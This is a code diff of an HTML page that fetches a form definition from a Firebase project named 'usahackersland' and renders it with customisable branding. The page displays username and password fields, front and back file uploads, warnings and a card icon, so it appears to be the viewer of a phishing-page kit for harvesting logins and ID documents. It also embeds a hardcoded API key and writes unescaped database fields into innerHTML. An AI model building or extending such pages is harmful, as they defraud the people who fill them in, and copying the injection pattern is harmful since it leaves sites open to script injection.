@@ -1,68 +1,102 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
-  <title>Form View</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Generated Form</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <style>
-    body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
-    .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
-    input, button, textarea { width: 100%; padding: 10px; margin-top: 8px; border-radius: 5px; border: 1px solid #ccc; }
-    img { display: block; margin: auto; max-width: 120px; }
-    h2, p { text-align: center; }
-    form button { margin-top: 15px; }
+    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
+    .form-container {
+      max-width: 800px;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    img, video { max-width: 100%; border-radius: 8px; margin-bottom: 10px; }
+    input, textarea, button {
+      width: 100%; margin: 10px 0; padding: 10px;
+      border-radius: 5px; border: 1px solid #ccc;
+    }
   </style>
 </head>
 <body>
-<div class="container" id="formContainer">Loading form...</div><script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  <div class="form-container" id="formView">Loading form...</div>
 
-const firebaseConfig = {
-  apiKey: "YOUR_API_KEY",
-  authDomain: "YOUR_PROJECT.firebaseapp.com",
-  projectId: "YOUR_PROJECT_ID",
-  storageBucket: "YOUR_PROJECT.appspot.com",
-  messagingSenderId: "YOUR_SENDER_ID",
-  appId: "YOUR_APP_ID"
-};
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+      authDomain: "usahackersland.firebaseapp.com",
+      projectId: "usahackersland",
+      storageBucket: "usahackersland.appspot.com",
+      messagingSenderId: "588407428267",
+      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+    const params = new URLSearchParams(location.search);
+    const formId = params.get("id");
+    const $ = id => document.getElementById(id);
 
-const id = new URLSearchParams(location.search).get("id");
-const container = document.getElementById("formContainer");
+    if (!formId) {
+      $('formView').innerHTML = `<p style="color:red;">❌ No form ID provided in URL.</p>`;
+    } else {
+      db.collection("forms").doc(formId).get().then(doc => {
+        if (!doc.exists) {
+          $('formView').innerHTML = `<p style="color:red;">❌ Form not found.</p>`;
+          return;
+        }
 
-async function loadForm() {
-  if (!id) return container.innerHTML = "Form ID is missing.";
-  const docRef = doc(db, "forms", id);
-  const snap = await getDoc(docRef);
+        const data = doc.data();
+        let html = `<div style="color:${data.textColor};background:${data.bgColor};padding:20px;border-radius:10px;background-image:url('${data.bgImageURL}');background-size:${data.bgWidth} ${data.bgHeight};">`;
 
-  if (!snap.exists()) {
-    container.innerHTML = "Form not found.";
-    return;
-  }
+        if (data.title) html += `<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
+        if (data.avatarURL) html += `<div style="text-align:center;"><img src="${data.avatarURL}" style="width:120px;border-radius:50%;border:2px solid #ccc;"></div>`;
+        if (data.bannerURL) html += `<img src="${data.bannerURL}" style="width:100%;">`;
+        if (data.logoURL) html += `<div style="text-align:center;"><img src="${data.logoURL}" style="width:100px;"></div>`;
+        if (data.description) html += `<p style="text-align:center;">${data.description}</p>`;
+        if (data.warning) html += `<p style="color:${data.warningColor};text-align:center;font-weight:bold;">${data.warning}</p>`;
 
-  const data = snap.data();
-  let html = `<div style="background:${data.bgColor}; color:${data.textColor}; padding:20px; border-radius:10px;">`;
-  if (data.logo) html += `<img src="${data.logo}">`;
-  if (data.title) html += `<h2>${data.title}</h2>`;
-  if (data.description) html += `<p>${data.description}</p>`;
-  if (data.warning) html += `<p style='color:red;font-weight:bold;'>${data.warning}</p>`;
+        html += `<form>`;
+        if (data.addAuth) {
+          html += `<input placeholder="${data.usernamePlaceholder || 'Username'}"><input type="password" placeholder="${data.passwordPlaceholder || 'Password'}">`;
+        }
 
-  html += `<form>`;
-  if (data.addAuth) {
-    html += `<label>Username</label><input type="text">
-             <label>Password</label><input type="password">`;
-  }
-  [...(data.fields || []), ...(data.extraFields || [])].forEach(f => {
-    if (f.trim()) html += `<label>${f}</label><input type="text">`;
-  });
+        if (data.frontDesc) html += `<label>${data.frontDesc}</label><input type="file">`;
+        if (data.backDesc) html += `<label>${data.backDesc}</label><input type="file">`;
+        if (data.extraDesc) html += `<p style="color:${data.extraDescColor}">${data.extraDesc}</p>`;
 
-  html += `<button style="background:${data.btnColor};color:white;padding:10px;">${data.buttonText || "Submit"}</button>`;
-  html += `</form></div>`;
+        const fields = [...(data.fields || []), ...(data.extraFields || [])];
+        fields.forEach(f => {
+          if (f.trim()) html += `<input placeholder="${f.trim()}">`;
+        });
 
-  container.innerHTML = html;
-}
+        let emoji = {
+          arrow: "➡️", check: "✅", lock: "🔒",
+          user: "👤", credit: "💳", none: ""
+        }[data.btnIcon] || "";
 
-loadForm();
-</script></body>
-</html>
+        html += `<button style="background:${data.btnColor};">${emoji} ${data.buttonText}</button>`;
+        if (data.footerText) html += `<p style="text-align:center;">${data.footerText}</p>`;
+        if (data.redirectDesc && data.useRedirect) html += `<p style="text-align:center;color:gray;">${data.redirectDesc}</p>`;
+        html += `</form>`;
+
+        if ((data.imageGallery || []).length || (data.videoGallery || []).length) {
+          html += `<div style="margin-top:15px;">`;
+          data.imageGallery.forEach(url => html += `<img src="${url}">`);
+          data.videoGallery.forEach(url => html += `<video controls src="${url}"></video>`);
+          html += `</div>`;
+        }
+
+        html += `</div>`;
+        $('formView').innerHTML = html;
+      }).catch(err => {
+        $('formView').innerHTML = `<p style="color:red;">⚠️ Error loading form.</p><pre>${err.message}</pre>`;
+      });
+    }
+  </script>
+</body>
+</html> 
